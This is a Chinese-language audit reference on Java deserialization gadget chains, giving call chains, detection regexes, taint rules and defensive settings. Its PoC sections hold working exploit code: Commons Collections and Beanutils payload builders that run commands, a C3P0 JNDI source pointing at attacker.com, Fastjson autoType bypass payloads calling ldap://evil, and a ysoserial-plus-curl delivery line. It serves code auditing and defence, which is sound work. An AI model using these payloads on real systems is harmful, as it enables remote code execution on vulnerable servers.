# Java Deserialization Gadget Chains - 完整审计规则

> 基于 ysoserial/JYso 的完整 Gadget 链分析
> 适用于: 代码审计中识别和利用反序列化漏洞

---

## 概述

本模块提供 107+ 条 Java 反序列化 Gadget 链的详细分析，包括：
- **调用链路**: 完整的类调用顺序
- **利用条件**: 依赖版本、JDK限制
- **代码特征**: 审计时需要查找的代码模式
- **检测规则**: Grep 正则和污点分析规则
- **PoC 示例**: 实际利用代码

---

## 目录

1. [Commons Collections 系列 (17条)](#commons-collections-系列)
2. [Commons Beanutils 系列 (8条)](#commons-beanutils-系列)
3. [Spring 系列 (7条)](#spring-系列)
4. [C3P0 系列 (10条)](#c3p0-系列)
5. [ROME 系列 (4条)](#rome-系列)
6. [Fastjson 系列 (2条)](#fastjson-系列)
7. [Jackson 系列 (5条)](#jackson-系列)
8. [JDK 原生系列 (5条)](#jdk-原生系列)
9. [其他重要 Gadget (49条)](#其他重要-gadget)

---

## Commons Collections 系列

### 核心原理

Commons Collections 利用链基于以下核心机制：
1. **Transformer 接口**: 可以执行任意方法调用
2. **ChainedTransformer**: 链式调用多个 Transformer
3. **InvokerTransformer**: 通过反射调用方法
4. **LazyMap**: 延迟初始化时触发 Transformer

### CC1 - 经典链条

**依赖**: commons-collections:3.1-3.2.1
**JDK限制**: < 8u71 (AnnotationInvocationHandler.readObject 被修复)

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> AnnotationInvocationHandler.readObject()
  │     ├─> Map(Proxy).entrySet()
  │     └─> AnnotationInvocationHandler.invoke()
  │           └─> LazyMap.get()
  │                 └─> ChainedTransformer.transform()
  │                       ├─> ConstantTransformer.transform() → Runtime.class
  │                       ├─> InvokerTransformer.transform() → getMethod("getRuntime")
  │                       ├─> InvokerTransformer.transform() → invoke(null) → Runtime.getRuntime()
  │                       └─> InvokerTransformer.transform() → exec("cmd")
```

**关键类和方法**:
```java
// 入口点
sun.reflect.annotation.AnnotationInvocationHandler.readObject()

// 触发点
org.apache.commons.collections.map.LazyMap.get()

// 执行点
org.apache.commons.collections.functors.InvokerTransformer.transform()
org.apache.commons.collections.functors.ChainedTransformer.transform()
org.apache.commons.collections.functors.ConstantTransformer.transform()
```

**代码审计规则**:
```regex
# 检测 Transformer 链构造
ChainedTransformer\s*\(
InvokerTransformer\s*\(.*"exec"
LazyMap\.decorate\(

# 检测危险的 Map 操作
Map.*entrySet\(\).*Transformer
AnnotationInvocationHandler.*newInstance

# 检测反序列化入口
ObjectInputStream.*readObject
```

**PoC 代码**:
```java
// 构造 Transformer 链
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

// 使用 AnnotationInvocationHandler 包装
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
```

---

### CC2 - PriorityQueue 链

**依赖**: commons-collections4:4.0
**JDK限制**: 8u301/11/15 可用, 16 失败

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> PriorityQueue.readObject()
  │     ├─> PriorityQueue.heapify()
  │     └─> PriorityQueue.siftDown()
  │           └─> TransformingComparator.compare()
  │                 └─> InvokerTransformer.transform()
  │                       └─> TemplatesImpl.newTransformer()
  │                             ├─> TemplatesImpl.getTransletInstance()
  │                             ├─> TemplatesImpl.defineTransletClasses()
  │                             └─> Malicious Class.<init>() → Runtime.exec()
```

**关键类和方法**:
```java
// 入口点
java.util.PriorityQueue.readObject()

// 触发点
org.apache.commons.collections4.comparators.TransformingComparator.compare()

// 执行点
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance()
```

**代码审计规则**:
```regex
# 检测 TemplatesImpl 的使用
TemplatesImpl\s*\(\)
_bytecodes\s*=
newTransformer\(\)

# 检测 PriorityQueue 的危险用法
PriorityQueue.*TransformingComparator
PriorityQueue.*readObject

# 检测字节码加载
defineTransletClasses\(\)
AbstractTranslet
```

**PoC 代码**:
```java
// 创建恶意 TemplatesImpl
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{maliciousClassBytes});
setFieldValue(templates, "_name", "Exploit");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

// 构造 PriorityQueue
TransformingComparator comparator = new TransformingComparator(
    new InvokerTransformer("newTransformer", null, null));
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(templates);

// 序列化
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(queue);
```

---

### CC6 - TiedMapEntry 链 (通用性最强)

**依赖**: commons-collections:3.1-3.2.1
**JDK限制**: 8u301/11/15/16 均可用 (最广泛兼容)

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> HashSet.readObject()
  │     ├─> HashMap.put()
  │     └─> HashMap.hash()
  │           └─> TiedMapEntry.hashCode()
  │                 └─> TiedMapEntry.getValue()
  │                       └─> LazyMap.get()
  │                             └─> ChainedTransformer.transform()
  │                                   └─> [执行链路同CC1]
```

**关键类和方法**:
```java
// 入口点
java.util.HashSet.readObject()
java.util.HashMap.readObject()

// 触发点
org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()

// 执行点
org.apache.commons.collections.map.LazyMap.get()
```

**代码审计规则**:
```regex
# 检测 TiedMapEntry 用法
TiedMapEntry\s*\(
TiedMapEntry.*LazyMap

# 检测 HashMap/HashSet 的危险用法
HashMap\.put.*TiedMapEntry
HashSet\.add.*Map

# 通用 Transformer 检测
ChainedTransformer
InvokerTransformer.*exec
```

**利用优势**:
- ✅ 不依赖 AnnotationInvocationHandler
- ✅ 兼容性最好，适用于大部分 JDK 版本
- ✅ 广泛用于实战攻击

---

### CC3 - ConstantTransformer + TemplatesImpl

**依赖**: commons-collections:3.1-3.2.1
**JDK限制**: < 8u71

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> AnnotationInvocationHandler.readObject()
  │     └─> [触发 LazyMap]
  │           └─> ChainedTransformer.transform()
  │                 ├─> ConstantTransformer.transform() → TemplatesImpl
  │                 └─> InvokerTransformer.transform("newTransformer")
  │                       └─> TemplatesImpl.newTransformer()
  │                             └─> [恶意字节码执行]
```

**特点**:
- 结合了 CC1 的触发机制和 CC2 的 TemplatesImpl 执行
- 不需要直接调用 Runtime.exec()
- 可以加载任意字节码

---

### CC4 - PriorityQueue + TemplatesImpl (CC4版本)

**依赖**: commons-collections4:4.0
**调用链**: 与 CC2 类似，但使用 CC4 版本的类

---

### CC5 - BadAttributeValueExpException

**依赖**: commons-collections:3.1-3.2.1
**JDK限制**: SecurityManager 关闭 (默认关闭)

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> BadAttributeValueExpException.readObject()
  │     └─> TiedMapEntry.toString()
  │           └─> TiedMapEntry.getValue()
  │                 └─> LazyMap.get()
  │                       └─> ChainedTransformer.transform()
```

**关键点**:
- 通过 `toString()` 方法触发
- 不需要 HashMap 或 PriorityQueue

---

### CC7 - Hashtable 触发

**依赖**: commons-collections:3.1-3.2.1
**JDK限制**: 8u301/11/15/16 均可用

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> Hashtable.readObject()
  │     └─> Hashtable.reconstitutionPut()
  │           └─> AbstractMapDecorator.equals()
  │                 └─> AbstractMap.equals()
  │                       └─> LazyMap.get()
  │                             └─> ChainedTransformer.transform()
```

---

### CC 其他变种

| Gadget | 核心特征 | 适用场景 |
|--------|---------|---------|
| CC8 | TreeBag 触发 | 特定场景绕过 |
| CC9 | DefaultedMap 触发 | CC4 版本的变种 |
| CC10 | InstantiateTransformer 触发 | 无需 Runtime.exec |
| CC11 | 组合多个 Transformer | 复杂利用链 |
| CC12 | PredicateTransformer | 条件执行 |
| CC13 | SwitchTransformer | 多分支执行 |

---

## Commons Beanutils 系列

### CB1 - BeanComparator

**依赖**: commons-beanutils:1.8.3-1.9.4
**JDK限制**: 无限制 (通用性强)

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> PriorityQueue.readObject()
  │     └─> PriorityQueue.heapify()
  │           └─> BeanComparator.compare()
  │                 ├─> PropertyUtils.getProperty()
  │                 └─> TemplatesImpl.getOutputProperties()
  │                       └─> TemplatesImpl.newTransformer()
  │                             └─> [恶意字节码执行]
```

**关键类和方法**:
```java
// 入口点
java.util.PriorityQueue.readObject()

// 触发点
org.apache.commons.beanutils.BeanComparator.compare()
org.apache.commons.beanutils.PropertyUtils.getProperty()

// 执行点
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
```

**代码审计规则**:
```regex
# 检测 BeanComparator 用法
BeanComparator\s*\(
PropertyUtils\.getProperty

# 检测 PriorityQueue + BeanComparator
PriorityQueue.*BeanComparator
BeanComparator.*TemplatesImpl

# 检测危险的 getter 调用
getOutputProperties\(\)
TemplatesImpl.*property
```

**PoC 代码**:
```java
// 创建 TemplatesImpl
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{maliciousClassBytes});
setFieldValue(templates, "_name", "Exploit");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

// 使用 BeanComparator
BeanComparator comparator = new BeanComparator("outputProperties");
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(templates);
queue.add(templates);
```

**利用优势**:
- ✅ 无 JDK 版本限制
- ✅ commons-beanutils 使用广泛
- ✅ 可绕过部分 WAF/RASP

---

### CB2 - PropertyUtils 链

**依赖**: commons-beanutils:1.8.3-1.9.2
**完整调用链**: 通过 PropertyUtils 的属性获取触发 getter 方法

---

## Spring 系列

### Spring1 - TypeProvider 链

**依赖**: spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
**JDK限制**: AnnotationInvocationHandler 可用 (< 8u71)

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
  │     ├─> SerializableTypeWrapper.TypeProvider(Proxy).getType()
  │     └─> AnnotationInvocationHandler.invoke()
  │           └─> HashMap.get("getType")
  │                 ├─> ReflectionUtils.findMethod()
  │                 ├─> SerializableTypeWrapper.TypeProvider(Proxy).getType()
  │                 └─> ReflectionUtils.invokeMethod()
  │                       └─> Templates(Proxy).newTransformer()
  │                             └─> AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
  │                                   └─> ObjectFactory(Proxy).getObject()
  │                                         └─> AnnotationInvocationHandler.invoke()
  │                                               └─> TemplatesImpl.newTransformer()
  │                                                     └─> [恶意字节码执行]
```

**关键类和方法**:
```java
// 入口点
org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()

// 触发点
org.springframework.core.SerializableTypeWrapper$TypeProvider.getType()
org.springframework.util.ReflectionUtils.invokeMethod()

// 执行点
org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()
```

**代码审计规则**:
```regex
# 检测 Spring 反射工具使用
ReflectionUtils\.invokeMethod
SerializableTypeWrapper
TypeProvider

# 检测 Spring ObjectFactory
ObjectFactory.*getObject
AutowireUtils.*invoke

# 检测 Spring 动态代理
MethodInvokeTypeProvider
ObjectFactoryDelegatingInvocationHandler
```

---

### Spring2 - JdkDynamicAopProxy

**依赖**: spring-aop, spring-core
**调用链**: 通过 AOP 代理触发方法调用

---

### Spring3 - AspectInstanceFactory

**依赖**: spring-aop
**调用链**: 通过 AspectJ 工厂触发

---

## C3P0 系列

### C3P0 - JNDI 注入

**依赖**: c3p0:0.9.5.2
**攻击类型**: JNDI Injection

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> PoolBackedDataSourceBase.readObject()
  │     └─> ReferenceIndirector$ReferenceSerialized.getObject()
  │           └─> ReferenceableUtils.referenceToObject()
  │                 └─> InitialContext.lookup()
  │                       └─> [JNDI 注入 RCE]
```

**关键类和方法**:
```java
// 入口点
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.readObject()

// 触发点
com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject()

// 执行点
javax.naming.InitialContext.lookup()
javax.naming.spi.NamingManager.getObjectInstance()
```

**代码审计规则**:
```regex
# 检测 C3P0 使用
c3p0.*DataSource
PoolBackedDataSource
C3P0ProxyConnection

# 检测 JNDI 注入点
connectionPoolDataSource\s*=
InitialContext.*lookup
Reference.*getObject

# 检测 Reference 构造
Reference\s*\(.*className.*codebase
Referenceable.*getReference
```

**PoC 代码**:
```java
// 方式1: 直接 JNDI 注入
PoolBackedDataSource poolBackedDataSource = new PoolBackedDataSource();
setFieldValue(poolBackedDataSource, "connectionPoolDataSource",
    new PoolSource("Evil", "http://attacker.com:8080/"));

// 方式2: 本地类加载
// 使用 hex 序列化的恶意类
```

**利用场景**:
- ✅ Shiro 反序列化 + C3P0
- ✅ Fastjson + C3P0 JNDI
- ✅ 绕过部分黑名单

---

### C3P0 其他变种

| Gadget | 特征 | 用途 |
|--------|------|------|
| C3P02 | WrapperConnectionPoolDataSource | 另一种触发点 |
| C3P03 | Hex 序列化字节码 | 绕过 JNDI 限制 |
| C3P0JDBC | JDBC 连接字符串利用 | 二次反序列化 |
| C3P0RefDataSource | RefDataSource 触发 | JNDI 注入变种 |

---

## ROME 系列

### ROME1 - ToStringBean 链

**依赖**: rome:1.0
**JDK限制**: 无

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> HashMap.readObject()
  │     └─> HashMap.hash()
  │           └─> EqualsBean.hashCode()
  │                 └─> EqualsBean.beanHashCode()
  │                       └─> ToStringBean.toString()
  │                             ├─> [反射调用所有 getter]
  │                             └─> TemplatesImpl.getOutputProperties()
  │                                   └─> [恶意字节码执行]
```

**关键类和方法**:
```java
// 入口点
java.util.HashMap.readObject()

// 触发点
com.sun.syndication.feed.impl.EqualsBean.hashCode()
com.sun.syndication.feed.impl.ToStringBean.toString()

// 执行点
TemplatesImpl.getOutputProperties()
```

**代码审计规则**:
```regex
# 检测 ROME 使用
com\.sun\.syndication
rome\.feed

# 检测 ToStringBean 用法
ToStringBean\s*\(
EqualsBean\s*\(
ObjectBean\s*\(

# 检测 toString 触发链
\.toString\(\).*TemplatesImpl
HashMap.*EqualsBean
```

---

## Fastjson 系列

### Fastjson1 - TemplatesImpl 链

**依赖**: fastjson < 1.2.83
**触发条件**: `JSON.parseObject()` + `@type`

**完整调用链**:
```
JSON.parseObject()
  ├─> ParserConfig.checkAutoType()  [绕过黑名单]
  │     └─> TypeUtils.loadClass()
  │           └─> [加载 TemplatesImpl]
  ├─> JavaBeanDeserializer.deserialize()
  │     └─> [调用所有 setter]
  │           ├─> set_bytecodes()
  │           ├─> set_name()
  │           └─> set_tfactory()
  └─> JSONArray.toString()
        └─> TemplatesImpl.getOutputProperties()
              └─> [恶意字节码执行]
```

**关键方法**:
```java
// 触发点
com.alibaba.fastjson.JSON.parseObject()
com.alibaba.fastjson.JSON.parse()

// 检查点
com.alibaba.fastjson.parser.ParserConfig.checkAutoType()

// 执行点
com.alibaba.fastjson.serializer.ObjectArrayCodec.write()
```

**代码审计规则**:
```regex
# 检测 Fastjson 使用
JSON\.parse\(
JSON\.parseObject\(
@type

# 检测危险配置
autoTypeSupport\s*=\s*true
Feature\.SupportAutoType

# 检测常见利用类
JdbcRowSetImpl
TemplatesImpl
JndiDataSourceFactory
```

**常见绕过技巧**:
```java
// 1.2.25-1.2.41: L 绕过
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://evil","autoCommit":true}

// 1.2.42: LL 绕过
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://evil","autoCommit":true}

// 1.2.43: [ 绕过
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://evil","autoCommit":true}

// 1.2.47: 缓存绕过
{"rand1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"rand2":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil","autoCommit":true}}
```

---

## JDK 原生系列

### Jdk7u21 - AnnotationInvocationHandler

**依赖**: 无 (JDK 原生)
**JDK限制**: <= 7u21

**完整调用链**:
```
ObjectInputStream.readObject()
  ├─> LinkedHashSet.readObject()
  │     └─> HashMap.put()
  │           └─> TemplatesImpl.hashCode()
  │                 └─> Proxy$0.hashCode()
  │                       └─> AnnotationInvocationHandler.invoke()
  │                             └─> LinkedHashMap.get()
  │                                   └─> TemplatesImpl.getOutputProperties()
  │                                         └─> [恶意字节码执行]
```

**关键点**:
- 无需第三方依赖
- JDK 版本限制严格
- 历史意义重大

---

### JRE8u20 - BeanContextSupport

**依赖**: 无 (JDK 原生)
**JDK限制**: 7u25 <= JDK <= 8u20

---

## 污点分析规则

### Source (反序列化入口)

```yaml
deserialization_sources:
  # Java 原生反序列化
  - pattern: "ObjectInputStream\\.readObject\\(\\)"
    class: "java.io.ObjectInputStream"
    method: "readObject"
    risk: "Critical"

  - pattern: "ObjectInputStream\\.readUnshared\\(\\)"
    class: "java.io.ObjectInputStream"
    method: "readUnshared"
    risk: "Critical"

  # XMLDecoder
  - pattern: "XMLDecoder\\.readObject\\(\\)"
    class: "java.beans.XMLDecoder"
    method: "readObject"
    risk: "Critical"

  # Fastjson
  - pattern: "JSON\\.parse(Object)?\\("
    class: "com.alibaba.fastjson.JSON"
    method: "parse|parseObject"
    risk: "High"

  # XStream
  - pattern: "XStream\\.fromXML\\("
    class: "com.thoughtworks.xstream.XStream"
    method: "fromXML"
    risk: "High"

  # Jackson
  - pattern: "ObjectMapper\\.readValue\\("
    class: "com.fasterxml.jackson.databind.ObjectMapper"
    method: "readValue"
    risk: "Medium"  # 需要 enableDefaultTyping

  # SnakeYAML
  - pattern: "Yaml\\.load\\("
    class: "org.yaml.snakeyaml.Yaml"
    method: "load"
    risk: "High"
```

### Sink (执行点)

```yaml
deserialization_sinks:
  # 命令执行
  - class: "java.lang.Runtime"
    method: "exec"
    type: "RCE"

  - class: "java.lang.ProcessBuilder"
    method: "start"
    type: "RCE"

  # 反射执行
  - class: "java.lang.reflect.Method"
    method: "invoke"
    type: "Reflection"

  # 类加载
  - class: "java.lang.ClassLoader"
    method: "defineClass"
    type: "ClassLoading"

  - class: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
    method: "newTransformer|getOutputProperties"
    type: "BytecodeExecution"

  # JNDI 注入
  - class: "javax.naming.InitialContext"
    method: "lookup"
    type: "JNDI"

  # 脚本执行
  - class: "javax.script.ScriptEngine"
    method: "eval"
    type: "ScriptExecution"
```

### Gadget Chain 检测

```yaml
gadget_patterns:
  # Commons Collections
  - name: "CC_InvokerTransformer"
    pattern: "org\\.apache\\.commons\\.collections.*InvokerTransformer"
    severity: "Critical"
    gadget_chains: ["CC1", "CC3", "CC5", "CC6"]

  - name: "CC_ChainedTransformer"
    pattern: "org\\.apache\\.commons\\.collections.*ChainedTransformer"
    severity: "Critical"
    gadget_chains: ["CC1", "CC2", "CC3"]

  - name: "CC_LazyMap"
    pattern: "org\\.apache\\.commons\\.collections.*LazyMap"
    severity: "High"
    gadget_chains: ["CC1", "CC3", "CC5", "CC6", "CC7"]

  # Commons Beanutils
  - name: "CB_BeanComparator"
    pattern: "org\\.apache\\.commons\\.beanutils\\.BeanComparator"
    severity: "Critical"
    gadget_chains: ["CB1", "CB2"]

  # Spring
  - name: "Spring_SerializableTypeWrapper"
    pattern: "org\\.springframework\\.core\\.SerializableTypeWrapper"
    severity: "High"
    gadget_chains: ["Spring1"]

  # C3P0
  - name: "C3P0_PoolBackedDataSource"
    pattern: "com\\.mchange\\.v2\\.c3p0.*PoolBackedDataSource"
    severity: "Critical"
    gadget_chains: ["C3P0"]

  # ROME
  - name: "ROME_ToStringBean"
    pattern: "com\\.sun\\.syndication.*ToStringBean"
    severity: "High"
    gadget_chains: ["ROME1"]
```

---

## 代码审计实战检测

### 第一步: 识别反序列化入口

```bash
# Grep 搜索反序列化函数
grep -rn "ObjectInputStream.*readObject" --include="*.java"
grep -rn "JSON\.parse" --include="*.java"
grep -rn "XStream.*fromXML" --include="*.java"
grep -rn "Yaml\.load" --include="*.java"

# 检查是否验证输入
grep -B5 -A5 "readObject\(\)" | grep -E "validate|check|whitelist"
```

### 第二步: 检测危险依赖

```bash
# 检查 pom.xml / build.gradle
grep -rn "commons-collections" pom.xml build.gradle
grep -rn "commons-beanutils" pom.xml build.gradle
grep -rn "fastjson.*1\\.2\\.[0-7]" pom.xml build.gradle
grep -rn "xstream.*1\\.4\\.1[0-7]" pom.xml build.gradle

# 检查实际使用的类
find . -name "*.jar" -exec jar tf {} \; | grep -E "InvokerTransformer|BeanComparator|TemplatesImpl"
```

### 第三步: 追踪数据流

```java
// 示例: 追踪 ObjectInputStream 的数据来源
public void handleRequest(HttpServletRequest request) {
    // Source: HTTP 请求
    InputStream input = request.getInputStream();

    // Potential Sink: 反序列化
    ObjectInputStream ois = new ObjectInputStream(input);  // ❌ 危险!
    Object obj = ois.readObject();
}
```

### 第四步: 验证 Gadget 链可用性

```java
// 检查是否存在利用链需要的类
// CC1 需要: InvokerTransformer, ChainedTransformer, LazyMap
// CB1 需要: BeanComparator, TemplatesImpl
// Spring1 需要: SerializableTypeWrapper, AutowireUtils

// 示例检测脚本
public boolean isGadgetAvailable(String gadgetName) {
    try {
        switch(gadgetName) {
            case "CC1":
                Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
                Class.forName("org.apache.commons.collections.map.LazyMap");
                return true;
            case "CB1":
                Class.forName("org.apache.commons.beanutils.BeanComparator");
                return true;
            // ... 更多检测
        }
    } catch (ClassNotFoundException e) {
        return false;
    }
    return false;
}
```

---

## 完整 Gadget 索引

### 按依赖分类

#### commons-collections (17条)
- CC1, CC2, CC3, CC4, CC5, CC6, CC7, CC8, CC9, CC10, CC11, CC12, CC13
- CCK1, CCK2, CCK3, CCK4

#### commons-beanutils (8条)
- CB1, CB2, CB3
- CommonsBeanutilsAttrCompare
- CommonsBeanutilsObjectToStringComparator
- CommonsBeanutilsPropertySource
- CommonsBeanutilsJDBC, CommonsBeanutilsJNDI

#### spring (7条)
- Spring1, Spring2, Spring3
- SpringAbstractBeanFactoryPointcutAdvisor
- SpringPartiallyComparableAdvisorHolder
- SpringPropertyPathFactory
- SpringUtil

#### c3p0 (10条)
- C3P0, C3P02, C3P03, C3P04, C3P092
- C3P0JDBC, C3P0JNDI, C3P0JNDI2
- C3P0RefDataSource, C3P0WrapperConnPool

#### rome (4条)
- ROME, ROME2, ROME3, ROMEJDBC

#### fastjson (2条)
- Fastjson1, Fastjson2

#### jackson (5条)
- Jackson1, Jackson2, Jackson3, Jackson4
- JacksonLdapAttr

### 按攻击类型分类

#### RCE (命令执行)
- CC1-CC13 (通过 Runtime.exec 或 TemplatesImpl)
- CB1-CB3 (通过 TemplatesImpl)
- Spring1-Spring3
- Groovy1-Groovy2
- ROME 系列

#### JNDI Injection
- C3P0 系列
- Fastjson (JdbcRowSetImpl)
- Jackson (JdbcRowSetImpl)
- CommonsBeanutilsJNDI

#### JDBC Attack
- C3P0JDBC
- ROMEJDBC
- CommonsBeanutilsJDBC

#### 探测类
- URLDNS (DNS 探测)

---

## 防御建议

### 1. 依赖管理

```xml
<!-- 升级到安全版本 -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.2</version>  <!-- 或移除 -->
</dependency>

<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>  <!-- 最新版本 -->
</dependency>
```

### 2. 反序列化过滤

```java
// JDK 9+ 使用 ObjectInputFilter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!org.apache.commons.collections.**;" +
    "!com.sun.rowset.**;" +
    "maxdepth=5;maxarray=100"
);

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
```

### 3. 禁用危险功能

```java
// Fastjson: 启用 safeMode
ParserConfig.getGlobalInstance().setSafeMode(true);

// Jackson: 不要使用 enableDefaultTyping
// ObjectMapper mapper = new ObjectMapper();
// mapper.enableDefaultTyping(); // ❌ 危险!

// XStream: 设置白名单
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.allowTypes(new Class[] { SafeClass.class });
```

---

## 参考资源

- [ysoserial](https://github.com/frohoff/ysoserial) - Java反序列化利用工具
- [JYso](https://github.com/qi4L/JYso) - 增强版 ysoserial
- [marshalsec](https://github.com/mbechler/marshalsec) - 多协议反序列化
- [Java反序列化备忘单](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)

---

## 最小 PoC 示例
```bash
# CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 "calc" | base64 > payload.b64
curl -X POST http://localhost:8080/api -d @payload.b64

# CB/ROME 等 gadget 参考 ysoserial/JYso
```

---

**最后更新**: 2024-12-26
**版本**: 1.0
**Gadget 数量**: 107+
